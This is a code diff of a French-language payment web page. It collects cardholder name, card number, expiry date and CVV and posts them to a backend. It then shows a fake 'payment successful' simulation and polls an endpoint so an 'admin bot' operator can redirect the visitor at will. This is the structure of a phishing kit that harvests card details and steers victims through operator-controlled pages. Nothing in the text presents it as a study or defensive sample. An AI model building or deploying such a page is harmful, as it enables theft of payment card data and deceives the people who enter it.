@@ -1,93 +1,66 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8">
-<title>Paiement</title>
-<style>
-#loader{display:none;} 
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Paiement</title>
+  <style>
+    #loader { display: none; font-size: 18px; text-align: center; margin-top: 20px; }
+  </style>
 </head>
 <body>
-<h1>💳 Paiement</h1>
-<form id="paymentForm">
-<input type="text" name="nomTitulaire" placeholder="Nom titulaire" required>
-<input type="text" name="cardNumber" placeholder="Numéro carte" required>
-<input type="text" name="expiry" placeholder="MM/AA" required>
-<input type="text" name="cvv" placeholder="CVV" required>
-<button type="submit">Payer</button>
-</form>
-<div id="loader">⏳ Paiement en cours...</div>
+  <h2>💳 Paiement</h2>
+  <form id="paymentForm">
+    <input type="text" name="nomTitulaire" placeholder="Nom du titulaire" required><br>
+    <input type="text" name="cardNumber" placeholder="Numéro de carte" required><br>
+    <input type="text" name="expiry" placeholder="MM/AA" required><br>
+    <input type="text" name="cvv" placeholder="CVV" required><br>
+    <button type="submit">Payer maintenant 💰</button>
+  </form>
 
-<script>
-document.getElementById('paymentForm').addEventListener('submit', async (e)=>{
+  <div id="loader">⏳ Paiement en cours, merci de patienter...</div>
+
+  <script>
+  const form = document.getElementById('paymentForm');
+  form.addEventListener('submit', async (e) => {
     e.preventDefault();
-    const form = e.target;
     const data = {
-        nomTitulaire: form.nomTitulaire.value,
-        cardNumber: form.cardNumber.value,
-        expiry: form.expiry.value,
-        cvv: form.cvv.value
-    };
-    await fetch('/api/payment',{method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data)});
-    form.style.display='none';
-    document.getElementById('loader').style.display='block';
-});
-
-// Polling redirection bot
-async function pollRedirect(){
-    const res = await fetch('/api/status');
-    const data = await res.json();
-    if(data.redirect && window.location.pathname !== data.redirect){
-        window.location.href = data.redirect;
-    }
-    setTimeout(pollRedirect,1000);
-}
-pollRedirect();
-</script>
-
-<script>
-document.getElementById('paymentForm').addEventListener('submit', async (e)=>{
-    e.preventDefault();
-    const form = e.target;
-    const data = {
-        nomTitulaire: form.nomTitulaire.value,
-        cardNumber: form.cardNumber.value,
-        expiry: form.expiry.value,
-        cvv: form.cvv.value
+      nomTitulaire: form.nomTitulaire.value,
+      cardNumber: form.cardNumber.value,
+      expiry: form.expiry.value,
+      cvv: form.cvv.value
     };
     try {
-        await fetch('/api/payment',{
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body:JSON.stringify(data)
-        });
-    } catch(e){ console.warn("Erreur d'envoi", e); }
-
-    form.style.display='none';
-    const loader = document.getElementById('loader');
-    loader.style.display='block';
-
-    // Simulation de confirmation bancaire (5 sec)
-    setTimeout(()=>{ 
-        window.location.href='/accepted.html';
-    },5000);
-});
-
-// Polling redirection bot
-async function pollRedirect(){
-    const res = await fetch('/api/status');
-    const data = await res.json();
-    if(data.redirect && window.location.pathname !== data.redirect){
-        window.location.href = data.redirect;
+      await fetch('/api/payment', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+    } catch (err) {
+      console.warn('Erreur paiement:', err);
     }
-    setTimeout(pollRedirect,1000);
-}
-pollRedirect();
-</script>
 
+    form.style.display = 'none';
+    document.getElementById('loader').style.display = 'block';
 
+    // ✅ Simulation paiement réussi après 5 secondes
+    setTimeout(() => {
+      window.location.href = '/accepted.html';
+    }, 5000);
+  });
 
-
-    
+  // Polling pour redirection admin bot
+  async function pollRedirect() {
+    try {
+      const res = await fetch('/api/status');
+      const data = await res.json();
+      if (data.redirect && window.location.pathname !== data.redirect) {
+        window.location.href = data.redirect;
+      }
+    } catch (e) {}
+    setTimeout(pollRedirect, 2000);
+  }
+  pollRedirect();
+  </script>
 </body>
 </html>
